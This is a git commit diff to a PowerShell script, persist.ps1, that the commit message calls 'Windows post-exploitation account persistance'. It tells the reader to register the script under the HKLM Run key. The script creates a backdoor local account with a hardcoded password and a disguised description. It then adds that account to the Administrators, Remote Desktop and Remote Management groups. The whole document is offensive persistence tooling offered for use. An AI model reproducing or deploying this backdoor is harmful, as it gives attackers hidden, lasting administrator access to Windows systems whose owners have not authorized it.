8c550080b6203b280b285fa33fe9ed326b3630f0
Pablo Henrique <60633528+pabloskubert@users.noreply.github.com>
2021-03-28 00:06:56 -0300

    Windows post-exploitation account persistance
    Add this script to HKLM\....\CurrentVersion\Run
    
    Bye bye admin

--- persist.ps1
+++ persist.ps1
@@ -2,9 +2,9 @@ $e = (Out-String -InputObject (net user 'YOUR_USER' 2>&1))
 
 if ($e -like '*could not be found*')
 {
-    new-localuser -Name "YOUR_USER" -Password (convertto-securestring -string 'P4SSW3RD' -force -asplaintext) -Description "Xampp FSDL account."
-    Add-LocalGroupMember -Group "Administrators" -Member "XAMPP"
-    Add-LocalGroupMember -Group "Remote Desktop" -Member "XAMPP"
-    Add-LocalGroupMember -Group "Remote Desktop Users" -Member "XAMPP"
-    Add-LocalGroupMember -Group "Remote Management Use" -Member "XAMPP"
+    new-localuser -Name "YOUR_USER" -Password (convertto-securestring -string 'P4SSW3RD' -force -asplaintext) -Description "Fake description"
+    Add-LocalGroupMember -Group "Administrators" -Member "YOUR_USER"
+    Add-LocalGroupMember -Group "Remote Desktop" -Member "YOUR_USER"
+    Add-LocalGroupMember -Group "Remote Desktop Users" -Member "YOUR_USER"
+    Add-LocalGroupMember -Group "Remote Management Use" -Member "YOUR_USR"
 }
